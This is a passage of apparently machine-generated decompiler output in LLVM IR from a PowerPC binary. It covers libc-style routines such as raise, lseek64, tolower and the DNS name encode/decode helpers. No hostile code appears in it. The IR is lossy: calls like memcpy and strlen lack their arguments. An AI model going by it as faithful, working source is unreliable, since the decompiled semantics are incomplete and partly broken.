  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 5, 6, 10, 1, 2, 3, 7, 8, 4, 0, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 2, 1 }
  uselistorder i32 10, { 12, 32, 33, 34, 35, 36, 37, 38, 23, 24, 20, 21, 22, 40, 39, 41, 42, 6, 45, 1, 27, 2, 28, 0, 7, 13, 48, 14, 25, 15, 26, 31, 8, 29, 30, 16, 9, 4, 5, 19, 43, 44, 17, 3, 11, 10, 47, 18, 46 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 26, 22, 23, 24, 0, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 6, { 29, 30, 31, 32, 33, 0, 1, 2, 21, 22, 23, 24, 10, 11, 36, 3, 25, 26, 6, 4, 27, 12, 28, 5, 13, 14, 15, 16, 17, 18, 7, 8, 19, 9, 20, 34, 35 }
  uselistorder i32* @global_var_10028798, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 46, 47, 48, 0, 49, 50, 51, 14, 18, 52, 68, 8, 9, 10, 15, 53, 30, 31, 32, 33, 34, 35, 36, 37, 5, 6, 38, 39, 40, 74, 19, 44, 66, 20, 69, 70, 71, 72, 4, 21, 73, 1, 2, 7, 22, 3, 16, 56, 57, 58, 59, 75, 41, 42, 54, 55, 23, 24, 25, 26, 27, 28, 29, 11, 12, 13, 43, 17, 45, 60, 61, 62, 63, 64, 65, 67 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 48, { 24, 10, 11, 12, 1, 13, 14, 5, 15, 16, 2, 17, 18, 19, 7, 20, 6, 21, 3, 0, 22, 23, 25, 26, 8, 9, 4 }
  uselistorder i32 36, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 4, 5, 0, 3, 1, 2, 15 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 16, { 54, 12, 55, 56, 13, 57, 58, 0, 59, 60, 1, 61, 14, 62, 63, 28, 29, 64, 74, 75, 65, 66, 67, 68, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 86, 43, 4, 25, 23, 51, 24, 76, 77, 90, 91, 92, 93, 69, 70, 44, 45, 46, 47, 48, 49, 87, 88, 89, 71, 2, 72, 73, 15, 16, 26, 27, 17, 5, 7, 9, 8, 18, 50, 19, 22, 52, 6, 53, 20, 78, 79, 80, 81, 82, 83, 21, 84, 3, 85, 10, 11 }
  uselistorder i32* @r27, { 46, 47, 48, 49, 50, 51, 1, 52, 53, 54, 55, 12, 13, 6, 14, 3, 2, 56, 57, 58, 59, 64, 0, 65, 66, 67, 68, 76, 77, 78, 79, 80, 81, 23, 24, 88, 4, 89, 7, 90, 95, 15, 16, 86, 87, 82, 83, 84, 85, 91, 92, 93, 25, 26, 69, 70, 71, 27, 28, 5, 29, 30, 31, 32, 8, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 9, 10, 11, 94, 72, 73, 74, 75, 44, 45, 60, 61, 62, 63, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 32, { 57, 58, 59, 26, 60, 61, 27, 17, 18, 66, 68, 42, 28, 25, 43, 44, 14, 15, 37, 38, 36, 2, 3, 4, 16, 13, 64, 62, 63, 45, 46, 29, 47, 48, 49, 50, 51, 52, 53, 0, 69, 70, 65, 39, 40, 41, 1, 21, 54, 55, 56, 22, 30, 67, 31, 6, 5, 8, 19, 7, 32, 10, 9, 33, 34, 12, 20, 11, 35, 23, 24 }
  uselistorder i32* @r10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 4, { 4, 113, 134, 5, 6, 230, 228, 229, 147, 231, 232, 233, 129, 7, 234, 235, 236, 237, 238, 239, 240, 8, 241, 9, 10, 11, 135, 242, 243, 148, 244, 245, 246, 12, 13, 130, 223, 14, 15, 185, 186, 187, 188, 189, 190, 247, 149, 16, 17, 304, 305, 150, 18, 19, 118, 20, 21, 22, 23, 24, 25, 255, 256, 151, 26, 27, 2, 28, 0, 191, 3, 29, 1, 257, 152, 30, 250, 251, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 306, 204, 119, 320, 327, 31, 32, 33, 34, 35, 307, 308, 36, 309, 37, 310, 38, 39, 167, 40, 41, 168, 42, 224, 225, 226, 274, 275, 276, 43, 169, 44, 45, 46, 170, 47, 171, 172, 284, 286, 285, 282, 283, 173, 174, 175, 176, 287, 288, 289, 290, 291, 292, 293, 294, 295, 48, 222, 49, 258, 153, 259, 260, 120, 50, 51, 261, 52, 262, 263, 264, 265, 266, 267, 131, 53, 268, 132, 311, 312, 205, 54, 55, 56, 133, 57, 140, 303, 58, 59, 280, 60, 61, 321, 322, 323, 154, 324, 325, 326, 62, 313, 314, 315, 116, 117, 316, 317, 155, 318, 319, 63, 64, 65, 66, 67, 68, 69, 70, 206, 71, 207, 208, 137, 209, 210, 211, 212, 213, 72, 73, 214, 215, 138, 216, 217, 139, 218, 219, 221, 74, 75, 114, 115, 220, 252, 76, 253, 156, 254, 248, 249, 77, 78, 121, 79, 177, 80, 122, 81, 82, 83, 84, 178, 157, 179, 158, 180, 181, 182, 183, 184, 85, 86, 87, 141, 143, 142, 144, 88, 159, 164, 165, 89, 136, 90, 227, 145, 269, 160, 270, 271, 272, 273, 277, 123, 91, 124, 92, 278, 93, 161, 146, 162, 94, 125, 163, 95, 96, 97, 126, 279, 127, 98, 128, 99, 100, 281, 101, 102, 103, 296, 104, 297, 105, 298, 106, 299, 107, 300, 108, 301, 109, 302, 110, 111, 112, 166 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100149b0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10014980, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1001497c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014938, { 1, 0 }
  uselistorder label %dec_label_pc_10014930, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001490c, { 1, 0 }
  uselistorder label %dec_label_pc_100148cc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001485c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100148ac, { 1, 0 }
  uselistorder label %dec_label_pc_10014844, { 1, 0 }
  uselistorder label %dec_label_pc_10014818, { 1, 0 }
  uselistorder label %dec_label_pc_100147fc, { 1, 0 }
  uselistorder label %dec_label_pc_10014764, { 1, 0 }
  uselistorder label %dec_label_pc_100146f8, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100149c8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268519904, i32* @lr, align 4
  %v0_100149dc = call i32 @__libc_getpid()
  %v0_100149e4 = load i32, i32* @r29, align 4
  store i32 %v0_100149c8, i32* @lr, align 4
  %v2_100149f4 = call i32 @kill(i32 %v0_100149dc, i32 %v0_100149e4)
  ret i32 %v2_100149f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 1, 3, 2 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100149f8 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_10014a24 = call i32 @__asm_mfcr()
  %v1_10014a28 = and i32 %v0_10014a24, 268435456
  %v3_10014a28 = icmp eq i32 %v1_10014a28, 0
  store i32 %v0_10014a24, i32* %r31.global-to-local, align 4
  store i32 %v0_10014a24, i32* %r0.global-to-local, align 4
  br i1 %v3_10014a28, label %dec_label_pc_10014a4c, label %dec_label_pc_10014a3c

dec_label_pc_10014a3c:                            ; preds = %entry
  %v0_10014a3c = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10014a44 = load i32, i32* %r31.global-to-local, align 4
  %v2_10014a44 = inttoptr i32 %v0_10014a3c to i32*
  store i32 %v0_10014a44, i32* %v2_10014a44, align 4
  %v0_10014a50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10014a50

dec_label_pc_10014a4c:                            ; preds = %entry
  %v3_10014a34 = icmp eq i32 %v0_10014a24, 0
  br i1 %v3_10014a34, label %dec_label_pc_10014a5c, label %dec_label_pc_10014a50

dec_label_pc_10014a50:                            ; preds = %dec_label_pc_10014a4c, %dec_label_pc_10014a3c
  %v0_10014a50 = phi i32 [ %v0_10014a24, %dec_label_pc_10014a4c ], [ %v0_10014a50.pre, %dec_label_pc_10014a3c ]
  %tmp = icmp slt i32 %v0_10014a50, 0
  %v1_10014a54 = zext i1 %tmp to i32
  %v2_10014a54 = ashr i32 %v0_10014a50, 31
  %v3_10014a54 = and i32 %v2_10014a54, -2
  %v4_10014a54 = or i32 %v3_10014a54, %v1_10014a54
  br label %dec_label_pc_10014a64

dec_label_pc_10014a5c:                            ; preds = %dec_label_pc_10014a4c
  %v3_10014a5c = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10014a64

dec_label_pc_10014a64:                            ; preds = %dec_label_pc_10014a50, %dec_label_pc_10014a5c
  %v0_10014a74 = phi i32 [ %v4_10014a54, %dec_label_pc_10014a50 ], [ %v3_10014a5c, %dec_label_pc_10014a5c ]
  store i32 %v0_100149f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014a74

; uselistorder directives
  uselistorder i32 %v0_10014a50, { 1, 0 }
  uselistorder i32 %v0_10014a24, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 2, 20, 3, 5, 11, 12, 7, 1, 0, 13, 14, 15, 17, 18, 16, 19, 6, 21, 4 }
  uselistorder i32 31, { 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 9, 10, 1, 2, 42, 43, 11, 12, 13, 29, 30, 3, 4, 0, 6, 5, 14, 15, 16, 49, 50, 47, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 41, 7, 44, 45, 46 }
  uselistorder i32 ()* @__errno_location, { 54, 34, 67, 66, 65, 41, 40, 53, 52, 39, 18, 36, 51, 50, 29, 43, 14, 13, 12, 11, 10, 24, 9, 7, 46, 45, 56, 55, 64, 63, 62, 23, 44, 22, 35, 3, 2, 49, 48, 47, 0, 38, 37, 15, 42, 17, 16, 61, 31, 30, 60, 28, 6, 20, 27, 19, 59, 58, 33, 26, 25, 57, 8, 5, 4, 1, 68, 32, 21 }
  uselistorder i32 268435456, { 4, 7, 19, 11, 5, 22, 23, 24, 25, 26, 16, 21, 6, 20, 0, 9, 10, 1, 12, 28, 17, 13, 18, 2, 8, 14, 15, 3, 27, 29, 30, 31 }
  uselistorder i32 140, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014a64, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014a78 = add i32 %arg1, 128
  %v1_10014a7c = mul i32 %arg1, 2
  %v2_10014a80 = icmp ugt i32 %v1_10014a78, 383
  %v0_10014a84 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10014a80, i32 %v0_10014a84)
  %v3_10014a8c = load i32, i32* bitcast (i32** @global_var_100287cc.644 to i32*), align 4
  %v2_10014a90 = add i32 %v1_10014a7c, %v3_10014a8c
  %v3_10014a90 = inttoptr i32 %v2_10014a90 to i16*
  %v4_10014a90 = load i16, i16* %v3_10014a90, align 2
  %v5_10014a90 = sext i16 %v4_10014a90 to i32
  ret i32 %v5_10014a90

; uselistorder directives
  uselistorder i32 128, { 17, 0, 1, 21, 22, 4, 5, 18, 3, 6, 7, 10, 11, 12, 13, 8, 14, 15, 16, 2, 9, 20, 19 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10014a9c = load i32, i32* @lr, align 4
  store i32 %v0_10014a9c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10014aa8 = load i32, i32* @r4, align 4
  store i32 %v0_10014aa8, i32* @r29, align 4
  %v0_10014aac = load i32, i32* @r5, align 4
  store i32 %v0_10014aac, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_10014b1813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_10014b1813, label %dec_label_pc_10014b34, label %dec_label_pc_10014b28

dec_label_pc_10014abc:                            ; preds = %dec_label_pc_10014b28
  store i32 268520128, i32* @lr, align 4
  %v3_10014abc = call i32 @__GI_strchr(i32 %v0_10014b2814, i32 46)
  store i32 %v3_10014abc, i32* @r30, align 4
  %v3_10014ac0 = icmp eq i32 %v3_10014abc, 0
  %v0_10014ac4 = load i32, i32* @r31, align 4
  store i32 %v0_10014ac4, i32* @r3, align 4
  %v2_10014ac8 = sub i32 %v3_10014abc, %v0_10014ac4
  store i32 %v2_10014ac8, i32* %r0.global-to-local, align 4
  br i1 %v3_10014ac0, label %dec_label_pc_10014ad0, label %dec_label_pc_10014ad8

dec_label_pc_10014ad0:                            ; preds = %dec_label_pc_10014abc
  %v0_10014ad0 = call i32 @__GI_strlen()
  store i32 %v0_10014ad0, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_10014ad0, 16777216
  %v1_10014ad4 = sdiv i32 %sext, 16777216
  store i32 %v1_10014ad4, i32* %r0.global-to-local, align 4
  %v0_10014ae8.pre = load i32, i32* @r31, align 4
  %v0_10014af8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014ad8

dec_label_pc_10014ad8:                            ; preds = %dec_label_pc_10014abc, %dec_label_pc_10014ad0
  %v0_10014af8 = phi i32 [ %v3_10014abc, %dec_label_pc_10014abc ], [ %v0_10014af8.pre, %dec_label_pc_10014ad0 ]
  %v0_10014ae8 = phi i32 [ %v0_10014ac4, %dec_label_pc_10014abc ], [ %v0_10014ae8.pre, %dec_label_pc_10014ad0 ]
  %v0_10014b04 = phi i32 [ %v2_10014ac8, %dec_label_pc_10014abc ], [ %v1_10014ad4, %dec_label_pc_10014ad0 ]
  %v0_10014adc = load i32, i32* @r28, align 4
  %v1_10014adc = load i32, i32* %r27.global-to-local, align 4
  %v2_10014adc = sub i32 %v1_10014adc, %v0_10014adc
  %v1_10014ae0 = add i32 %v0_10014adc, 1
  store i32 %v1_10014ae0, i32* %r11.global-to-local, align 4
  %v1_10014ae4 = add i32 %v2_10014adc, -1
  store i32 %v0_10014ae8, i32* @r4, align 4
  %v0_10014aec = load i32, i32* @r29, align 4
  %v2_10014aec = add i32 %v0_10014aec, %v1_10014ae0
  store i32 %v2_10014aec, i32* @r3, align 4
  store i32 %v0_10014b04, i32* @r5, align 4
  %v2_10014af4 = icmp ult i32 %v0_10014b04, %v1_10014ae4
  %v1_10014af8 = add i32 %v0_10014af8, 1
  store i32 %v1_10014af8, i32* @r31, align 4
  %v3_10014ad8.not = icmp ne i32 %v0_10014b04, 0
  %or.cond = and i1 %v2_10014af4, %v3_10014ad8.not
  br i1 %or.cond, label %dec_label_pc_10014b04, label %dec_label_pc_10014b4c

dec_label_pc_10014b04:                            ; preds = %dec_label_pc_10014ad8
  %v3_10014b04 = trunc i32 %v0_10014b04 to i8
  %v4_10014b04 = add i32 %v0_10014aec, %v0_10014adc
  %v5_10014b04 = inttoptr i32 %v4_10014b04 to i8*
  store i8 %v3_10014b04, i8* %v5_10014b04, align 1
  %v0_10014b08 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014b08 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014b08 = add i32 %v1_10014b08, %v0_10014b08
  store i32 %v2_10014b08, i32* @r28, align 4
  store i32 268520208, i32* @lr, align 4
  %v0_10014b0c = call i32 @memcpy()
  store i32 %v0_10014b0c, i32* %r3.global-to-local, align 4
  %v0_10014b10 = load i32, i32* @r30, align 4
  %v3_10014b10 = icmp eq i32 %v0_10014b10, 0
  br i1 %v3_10014b10, label %dec_label_pc_10014b34, label %dec_label_pc_10014b04.dec_label_pc_10014b18_crit_edge

dec_label_pc_10014b04.dec_label_pc_10014b18_crit_edge: ; preds = %dec_label_pc_10014b04
  %v0_10014b18.pre = load i32, i32* @r31, align 4
  %v3_10014b18 = icmp eq i32 %v0_10014b18.pre, 0
  store i32 %v0_10014b18.pre, i32* @r3, align 4
  br i1 %v3_10014b18, label %dec_label_pc_10014b34, label %dec_label_pc_10014b28

dec_label_pc_10014b28:                            ; preds = %entry, %dec_label_pc_10014b04.dec_label_pc_10014b18_crit_edge
  %v0_10014b2814 = phi i32 [ %v0_10014b18.pre, %dec_label_pc_10014b04.dec_label_pc_10014b18_crit_edge ], [ %tmp, %entry ]
  %v1_10014b28 = inttoptr i32 %v0_10014b2814 to i8*
  %v2_10014b28 = load i8, i8* %v1_10014b28, align 1
  %v3_10014b28 = zext i8 %v2_10014b28 to i32
  store i32 %v3_10014b28, i32* %r0.global-to-local, align 4
  %v3_10014b2c = icmp eq i8 %v2_10014b28, 0
  br i1 %v3_10014b2c, label %dec_label_pc_10014b34, label %dec_label_pc_10014abc

dec_label_pc_10014b34:                            ; preds = %dec_label_pc_10014b04.dec_label_pc_10014b18_crit_edge, %dec_label_pc_10014b04, %dec_label_pc_10014b28, %entry
  %v0_10014b34 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_10014b34, 1
  br i1 %tmp10, label %dec_label_pc_10014b4c, label %dec_label_pc_10014b3c

dec_label_pc_10014b3c:                            ; preds = %dec_label_pc_10014b34
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014b40 = load i32, i32* @r28, align 4
  %v1_10014b40 = add i32 %v0_10014b40, 1
  store i32 %v1_10014b40, i32* %r3.global-to-local, align 4
  %v1_10014b44 = load i32, i32* @r29, align 4
  %v4_10014b44 = add i32 %v1_10014b44, %v0_10014b40
  %v5_10014b44 = inttoptr i32 %v4_10014b44 to i8*
  store i8 0, i8* %v5_10014b44, align 1
  %v0_10014b60.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014b50

dec_label_pc_10014b4c:                            ; preds = %dec_label_pc_10014ad8, %dec_label_pc_10014b34
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014b50

dec_label_pc_10014b50:                            ; preds = %dec_label_pc_10014b3c, %dec_label_pc_10014b4c
  %v0_10014b60 = phi i32 [ %v0_10014b60.pre, %dec_label_pc_10014b3c ], [ -1, %dec_label_pc_10014b4c ]
  store i32 %v0_10014a9c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014b60

; uselistorder directives
  uselistorder i32 %v0_10014b2814, { 1, 0 }
  uselistorder i32 %v0_10014b18.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10014b04, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10014ad4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 9, 26, 25, 16, 15, 20, 19, 18, 27, 24, 23, 14, 12, 13, 11, 10, 22, 21, 17, 8, 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 3, 2, 4, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 4, 3, 5, 6, 7, 1, 2 }
  uselistorder label %dec_label_pc_10014b50, { 1, 0 }
  uselistorder label %dec_label_pc_10014b4c, { 1, 0 }
  uselistorder label %dec_label_pc_10014b34, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10014b28, { 1, 0 }
  uselistorder label %dec_label_pc_10014ad8, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_10014b68 = call i32 @__asm_mfcr()
  store i32 %v0_10014b68, i32* @r26, align 4
  %v3_10014b74 = icmp eq i32 %v0_10014b68, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_10014b84 = load i32, i32* @r6, align 4
  store i32 %v0_10014b84, i32* @r24, align 4
  br i1 %v3_10014b74, label %dec_label_pc_10014c3c, label %dec_label_pc_10014b8c

dec_label_pc_10014b8c:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10014c1814 = load i32, i32* @r4, align 4
  %v2_10014c1815 = add i32 %v1_10014c1814, %v0_10014b68
  %v3_10014c1816 = inttoptr i32 %v2_10014c1815 to i8*
  %v4_10014c1817 = load i8, i8* %v3_10014c1816, align 1
  %v5_10014c1818 = zext i8 %v4_10014c1817 to i32
  store i32 %v5_10014c1818, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_10014c2020 = icmp eq i8 %v4_10014c1817, 0
  br i1 %v3_10014c2020, label %dec_label_pc_10014c2c, label %dec_label_pc_10014b9c

dec_label_pc_10014b9c:                            ; preds = %dec_label_pc_10014b8c, %dec_label_pc_10014c14
  %v3_10014c1c22 = phi i1 [ %v3_10014c1c, %dec_label_pc_10014c14 ], [ false, %dec_label_pc_10014b8c ]
  %v5_10014c1821 = phi i32 [ %v5_10014c18, %dec_label_pc_10014c14 ], [ %v5_10014c1818, %dec_label_pc_10014b8c ]
  br i1 %v3_10014c1c22, label %dec_label_pc_10014ba4, label %dec_label_pc_10014ba0

dec_label_pc_10014ba0:                            ; preds = %dec_label_pc_10014b9c
  %v0_10014ba0 = load i32, i32* %r27.global-to-local, align 4
  %v1_10014ba0 = add i32 %v0_10014ba0, 1
  store i32 %v1_10014ba0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014ba4

dec_label_pc_10014ba4:                            ; preds = %dec_label_pc_10014b9c, %dec_label_pc_10014ba0
  %v1_10014ba4 = call i32 @__asm_rlwinm(i32 %v5_10014c1821, i32 0, i32 24, i32 25)
  %v0_10014ba8 = load i32, i32* @r4, align 4
  %v1_10014ba8 = add i32 %v0_10014ba8, 1
  store i32 %v1_10014ba8, i32* @r30, align 4
  %v3_10014bac = icmp eq i32 %v1_10014ba4, 192
  br i1 %v3_10014bac, label %dec_label_pc_10014bb4, label %dec_label_pc_10014bd4

dec_label_pc_10014bb4:                            ; preds = %dec_label_pc_10014ba4
  %v0_10014bb4 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10014bb4, label %dec_label_pc_10014bbc, label %dec_label_pc_10014bb8

dec_label_pc_10014bb8:                            ; preds = %dec_label_pc_10014bb4
  %v0_10014bb8 = load i32, i32* %r27.global-to-local, align 4
  %v1_10014bb8 = add i32 %v0_10014bb8, 1
  store i32 %v1_10014bb8, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014bbc

dec_label_pc_10014bbc:                            ; preds = %dec_label_pc_10014bb4, %dec_label_pc_10014bb8
  %v0_10014bbc = load i32, i32* @r26, align 4
  %v2_10014bbc = add i32 %v0_10014bbc, %v1_10014ba8
  %v3_10014bbc = inttoptr i32 %v2_10014bbc to i8*
  %v4_10014bbc = load i8, i8* %v3_10014bbc, align 1
  %v5_10014bbc = zext i8 %v4_10014bbc to i32
  %v1_10014bc0 = call i32 @__asm_rlwinm(i32 %v5_10014c1821, i32 8, i32 18, i32 23)
  %v0_10014bc4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10014bc4, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10014bcc = or i32 %v5_10014bbc, %v1_10014bc0
  store i32 %v2_10014bcc, i32* @r4, align 4
  br label %dec_label_pc_10014c14

dec_label_pc_10014bd4:                            ; preds = %dec_label_pc_10014ba4
  %v0_10014bd4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014bd4 = add i32 %v0_10014bd4, %v5_10014c1821
  store i32 %v2_10014bd4, i32* @r29, align 4
  %v1_10014bd8 = add i32 %v2_10014bd4, 1
  store i32 %v1_10014bd8, i32* @r28, align 4
  %v1_10014bdc = load i32, i32* @r24, align 4
  %v2_10014bdc = icmp ult i32 %v1_10014bd8, %v1_10014bdc
  br i1 %v2_10014bdc, label %dec_label_pc_10014be4, label %dec_label_pc_10014c3c

dec_label_pc_10014be4:                            ; preds = %dec_label_pc_10014bd4
  %v0_10014be4 = load i32, i32* @r26, align 4
  %v2_10014be4 = add i32 %v0_10014be4, %v1_10014ba8
  store i32 %v2_10014be4, i32* @r4, align 4
  %v0_10014be8 = load i32, i32* @r25, align 4
  %v2_10014be8 = add i32 %v0_10014be8, %v0_10014bd4
  store i32 %v2_10014be8, i32* @r3, align 4
  store i32 %v5_10014c1821, i32* @r5, align 4
  store i32 268520436, i32* @lr, align 4
  %v0_10014bf0 = call i32 @memcpy()
  %v0_10014bf4 = load i32, i32* @r30, align 4
  %v2_10014bf4 = add i32 %v0_10014bf4, %v5_10014c1821
  store i32 %v2_10014bf4, i32* @r4, align 4
  %v0_10014bf8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10014bf8, label %dec_label_pc_10014c00, label %dec_label_pc_10014bfc

dec_label_pc_10014bfc:                            ; preds = %dec_label_pc_10014be4
  %v0_10014bfc = load i32, i32* %r27.global-to-local, align 4
  %v2_10014bfc = add i32 %v0_10014bfc, %v5_10014c1821
  store i32 %v2_10014bfc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014c00

dec_label_pc_10014c00:                            ; preds = %dec_label_pc_10014be4, %dec_label_pc_10014bfc
  %v0_10014c00 = load i32, i32* @r26, align 4
  %v2_10014c00 = add i32 %v0_10014c00, %v2_10014bf4
  %v3_10014c00 = inttoptr i32 %v2_10014c00 to i8*
  %v4_10014c00 = load i8, i8* %v3_10014c00, align 1
  %v3_10014c04 = icmp eq i8 %v4_10014c00, 0
  br i1 %v3_10014c04, label %dec_label_pc_10014c10, label %dec_label_pc_10014c0c

dec_label_pc_10014c0c:                            ; preds = %dec_label_pc_10014c00
  br label %dec_label_pc_10014c10

dec_label_pc_10014c10:                            ; preds = %dec_label_pc_10014c00, %dec_label_pc_10014c0c
  %v0_10014c10.off0 = phi i8 [ 0, %dec_label_pc_10014c00 ], [ 46, %dec_label_pc_10014c0c ]
  %v1_10014c10 = load i32, i32* @r25, align 4
  %v2_10014c10 = load i32, i32* @r29, align 4
  %v4_10014c10 = add i32 %v2_10014c10, %v1_10014c10
  %v5_10014c10 = inttoptr i32 %v4_10014c10 to i8*
  store i8 %v0_10014c10.off0, i8* %v5_10014c10, align 1
  %v0_10014c14.pre = load i32, i32* @r28, align 4
  %v0_10014c1c.pre.pre = load i32, i32* @r23, align 4
  %v1_10014c18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014c14

dec_label_pc_10014c14:                            ; preds = %dec_label_pc_10014bbc, %dec_label_pc_10014c10
  %v1_10014c18 = phi i32 [ %v2_10014bcc, %dec_label_pc_10014bbc ], [ %v1_10014c18.pre, %dec_label_pc_10014c10 ]
  %v0_10014c1c.pre = phi i32 [ 0, %dec_label_pc_10014bbc ], [ %v0_10014c1c.pre.pre, %dec_label_pc_10014c10 ]
  %v0_10014c14 = phi i32 [ %v0_10014bc4, %dec_label_pc_10014bbc ], [ %v0_10014c14.pre, %dec_label_pc_10014c10 ]
  %v0_10014c18.pre = load i32, i32* @r26, align 4
  store i32 %v0_10014c14, i32* %r11.global-to-local, align 4
  %v2_10014c18 = add i32 %v1_10014c18, %v0_10014c18.pre
  %v3_10014c18 = inttoptr i32 %v2_10014c18 to i8*
  %v4_10014c18 = load i8, i8* %v3_10014c18, align 1
  %v5_10014c18 = zext i8 %v4_10014c18 to i32
  store i32 %v5_10014c18, i32* @r31, align 4
  %v3_10014c1c = icmp eq i32 %v0_10014c1c.pre, 0
  store i1 %v3_10014c1c, i1* %cr4_eq.global-to-local, align 1
  %v3_10014c20 = icmp eq i8 %v4_10014c18, 0
  br i1 %v3_10014c20, label %dec_label_pc_10014c28, label %dec_label_pc_10014b9c

dec_label_pc_10014c28:                            ; preds = %dec_label_pc_10014c14
  %v0_10014c30.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10014c1c, label %dec_label_pc_10014c3c, label %dec_label_pc_10014c2c

dec_label_pc_10014c2c:                            ; preds = %dec_label_pc_10014b8c, %dec_label_pc_10014c28
  %v0_10014c30.pre26 = phi i32 [ %v0_10014c30.pre.pre, %dec_label_pc_10014c28 ], [ 0, %dec_label_pc_10014b8c ]
  %v1_10014c2c = add i32 %v0_10014c30.pre26, 1
  store i32 %v1_10014c2c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014c3c

